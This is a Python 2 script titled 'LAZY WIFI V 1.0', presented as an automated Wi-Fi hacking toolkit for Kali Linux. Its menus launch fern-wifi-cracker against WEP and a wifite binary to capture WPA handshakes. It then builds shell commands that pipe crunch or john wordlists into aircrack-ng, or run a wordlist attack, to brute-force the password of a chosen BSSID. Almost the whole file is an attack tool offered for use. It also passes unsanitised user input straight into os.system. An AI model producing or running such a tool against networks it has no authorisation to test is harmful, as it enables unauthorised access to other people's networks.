#!/usr/bin/python
import os
import subprocess
import sys
import time

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray

def banner():




	print G+'###########################################################################################'
	print '#                                   <<<LAZY WIFI V 1.0>>>                                 #'
	print '#                                    WIFI HACKING TOOLKIT                                 #'
	print '#                                 made by <<Aman Bhandari aka Codie>>                              #'
	print '#                              operating system : KALI,BACKTRACK                          #'
	print '#                                    AUTOMATED HACKING TOOL                               #'
	print '#                                                                                         #'
	print '#                                                                                         #'
	print '###########################################################################################'

	time.sleep(3)

def handshakesave():
	handshakesave = '/root/lazywifi'+'/wifite'
	a = os.system(handshakesave) 
	print a
	time.sleep(2)
	#print 'HANDSHAKE SAVED......'
	#time.sleep(2)
	

def options():
	
	while True:
		print B+'  '
		print B+'SELECT OPTION TO HACK :'
		print B+'__________________________________________________________________________________'
		print B+' '
		print B+'<<1. WEP HACK>>'
		print B+'<<2. WPA/WPA2 HACK>>'
		print B+'<<3. EXIT>>'
		print O+'__________________________________________________________________________________'
		op = input(P+'select your option : ')
		if op == 1:
			print ' '
			print 'FERN-WIFI-CRACKER....PREINSTALLED IN KALI...GRAPHICAL AND EASY TO USE...100% WORKING WITH WEP SECURITY TO CRACK....' 
			fern = 'fern-wifi-cracker'
			time.sleep(2)
			fernwifi = os.system(fern)
			print G+'HOPE FERN-WIFI-CRACKER HELP YOU......THANX TO KALI..'
			print G+'u want to hack again....'
			print O+'___________________________________________________________________________'
			time.sleep(3)
		if op == 2:
			print G+'FOR WPA/WPA2 HACK WE NEED HANDSHAKE FILE.....SO WE USE HANDSHAKESAVER...IT ALSO HACK WPS SECURITY IF MODEM SUPPORT....'
			time.sleep(3)
			handshakesave()
			print B+'your handshake file saved to hv folder......'
			print B+'<<....IF NOT SAVE THEN PRESS (CNTR+C) AND START PROCESS AGAIN....>>'  
			time.sleep(4)
			print ' '
			print B+'NOW START BRUTEFORCE ATTACK TO GET PASSWORD.....'
			print '   '
			print R+'<<...........CHOOSE YOUR BRUTEFORCE METHOD.............>>'
			print   '  ' 
			print G+'<<1. use crunch for automatic dictionary>>'
			print G+'<<2. use john for automatic dictionary>>'
			print G+'<<3. Dictionary attack>>'
			print ' '
			attack = input(O+'select your option of attack :')
			print ' '
			if attack == 1:
				print O+ '<........CRACKING BY CRUNCH............>'
				time.sleep(3)
				print B+'<<1. full dictionary from 8-12 capital-small-alphanumeric password without special characters'
				print B+'<<2. numeric dictionary from 8-12>>'
				print B+'<<3. custom dictionary>>'
				print  ' '
				dictionary=input(O+'CHOOSE DICTIONARY : ')
				if dictionary == 1:
					print G+'____________________________________________________________'
					print R+'GO TO hs DIRECORY WHERE .cap FILE SAVE..IT IS IN SAME DIRECORY example : IRIS402_46-91-DB-7A-CC-45_1.cap'
					time.sleep(3)
					
					print ' '
					capfile = raw_input(G+'.cap file name which is in hs folder :')
					print ' '
					print R+'bssid code..attach with file name..ex: IRIS402_46-91-DB-7A-CC-45.cap so in this bssid is 46:91:DB:7A:CC:45' 
					time.sleep(3)
					print ' '
					sid = raw_input(G+'bssid to hack :')	
					crunchcmd=  'crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 '+'| '+'aircrack-ng '+'-b '+sid+' -w- '+'/root/lazywifi/hs/'+capfile	
					cr = os.system(crunchcmd)
					print "HOPE IT HELP TO YOU......."
					time.sleep(3)
				if dictionary ==2:
					print G+'____________________________________________________________'
                                        print R+'GO TO hs DIRECORY WHERE .cap FILE SAVE..IT IS IN SAME DIRECORY'
                                        time.sleep(3)
					print ' '
                                        capfile = raw_input(G+'.cap file name which is in hs folder :')
                                        print ' '
					print R+'bssid code..attach with file name..ex: IRIS402_46-91-DB-7A-CC-7A-CC-45.cap so in this bssid is 46:91:DB:7A:CC:45'
                                        time.sleep(3)
					print ' '
					sid = raw_input(G+'bssid to hack :')
                                        crunchcmd= 'crunch 8 12 0123456789  '+'| '+'aircrack-ng '+'-b '+sid+' -w- '+'/root/lazywifi/hs/'+capfile
                                        cr = os.system(crunchcmd)
                                        print "HOPE IT HELP TO YOU..."
					time.sleep(3)
				if dictionary ==3:
                                        print G+'____________________________________________________________'
                                        print R+'GO TO hs DIRECORY WHERE .cap FILE SAVE..IT IS IN SAME DIRECORY'
                                        time.sleep(3)
					print ' '
                                        capfile = raw_input(G+'.cap file name which is in hs folder :')
                                        print R+'bssid code..attach with file name..ex: IRIS402_46-91-DB-7A-CC-7A-CC-45.cap so in this bssid is 46:91:DB:7A:CC:45'
                                        time.sleep(3)
					print ' ' 
					sid = raw_input(G+'bssid to hack :')
					min = raw_input(G+'minimum password length : ')
					max = raw_input(G+'maximum password length : ')
					char = raw_input(G+'character/number.special character :')
                                        crunchcmd= 'crunch '+min+' '+max+' '+char+' | '+'aircrack-ng '+'-b '+sid+' -w- '+'/root/lazywifi/hs/'+capfile
                                        cr = os.system(crunchcmd)
                                        print "HOPE IT HELP TO YOU...."
					time.sleep(3)

			if attack == 2:
				print B+'<<.......CRACKING BY JOHN.........>>'
				time.sleep(2)			
			        print B+'<<1. full dictionary (min starting:8)'
                                print B+'<<2. numeric dictionary attack from>>'
                                print B+'<<3. alpha dictionary attack>>'
                                print  ' '
                                dictionary=input(O+'CHOOSE DICTIONARY : ')
				if dictionary == 1:
					print G+'____________________________________________________________'
                                        print R+'GO TO hs DIRECORY WHERE .cap FILE SAVE..IT IS IN SAME DIRECORY'
                                        time.sleep(3)

                                        print ' '
                                        capfile = raw_input(G+'.cap file name which is in hs folder :')
                                        print ' '
                                        print R+'bssid code..attach with file name..ex: IRIS402_46-91-DB-7A-CC-7A-CC-45.cap so in this bssid is 46:91:DB:7A:CC:45'
                                        time.sleep(3)
                                        print ' '
                                        sid = raw_input(G+'bssid to hack : ')
                                        crunchcmd=  'john --stdout --incremental:all '+'| '+'aircrack-ng -b '+sid+' -w - '+'/root/lazywifi/hs/'+capfile
                                        cr = os.system(crunchcmd)
                                        print "HOPE IT HELP TO YOU......."
                                        time.sleep(3)
				if dictionary == 2:
					print G+'____________________________________________________________'
                                        print R+'GO TO hs DIRECORY WHERE .cap FILE SAVE..IT IS IN SAME DIRECORY'
                                        time.sleep(3)

                                        print ' '
                                        capfile = raw_input(G+'.cap file name which is in hs folder :')
                                        print ' '
                                        print R+'bssid code..attach with file name..ex: IRIS402_46-91-DB-7A-CC-7A-CC-45.cap so in this bssid is 46:91:DB:7A:CC:45'
                                        time.sleep(3)
                                        print ' '
                                        sid = raw_input(G+'bssid to hack : ')
                                        crunchcmd=  'john --stdout --incremental:digits '+'| '+'aircrack-ng -b '+sid+' -w - '+'/root/lazywifi/hs/'+capfile
                                        cr = os.system(crunchcmd)
                                        print "HOPE IT HELP TO YOU......."
                                        time.sleep(3)
				if dictionary == 3:
					print G+'____________________________________________________________'
                                        print R+'GO TO hs DIRECORY WHERE .cap FILE SAVE..IT IS IN SAME DIRECORY'
                                        time.sleep(3)

                                        print ' '
                                        capfile = raw_input(G+'.cap file name which is in hs folder :')
                                        print ' '
                                        print R+'bssid code..attach with file name..ex: IRIS402_46-91-DB-7A-CC-45.cap so in this bssid is 46:91:DB:7A:CC:45'
                                        time.sleep(3)
                                        print ' '
                                        sid = raw_input(G+'bssid to hack : ')
                                        crunchcmd=  'john --stdout --incremental:alpha '+'| '+'aircrack-ng -b '+sid+' -w - '+'/root/lazywifi/hs/'+capfile
                                        cr = os.system(crunchcmd)
                                        print "HOPE IT HELP TO YOU......."
                                        time.sleep(3)

			if attack == 3:
				print B+'<<.......DICTIONARY ATTACK.........>>'
                                time.sleep(2)
				print G+'____________________________________________________________'
                                print R+'GO TO hs DIRECORY WHERE .cap FILE SAVE..IT IS IN SAME DIRECORY'
                                time.sleep(3)

                                print ' '
                                capfile = raw_input(G+'.cap file name which is in hs folder :')
                                print ' '
                                print R+'bssid code..attach with file name..ex: IRIS402_46-91-DB-7A-CC-45.cap so in this bssid is 46:91:DB:7A:CC:45'
                                time.sleep(3)
                                print ' '
                                sid = raw_input(G+'bssid to hack : ')
				print ' '
				wo = raw_input(G+'word list (full link) <ex : /root/wordlist.txt> : ')
				dict = 'aircrack-ng '+'-w '+wo+' -b '+sid+' /root/lazywifi/hs/'+capfile
				cr = os.system(dict)
				time.sleep(2)
                                print "HOPE IT HELP TO YOU......."
                                time.sleep(3)


		if op == 3:
			print O+'...THANX FOR USING MY SCRIPT...'
			time.sleep(3)
			print O+'NOW I AM EXITING........... :p :p'
			time.sleep(2)
			sys.exit(0)
 

def main():
	banner()
	options()
	
if __name__ =='__main__':
	main()
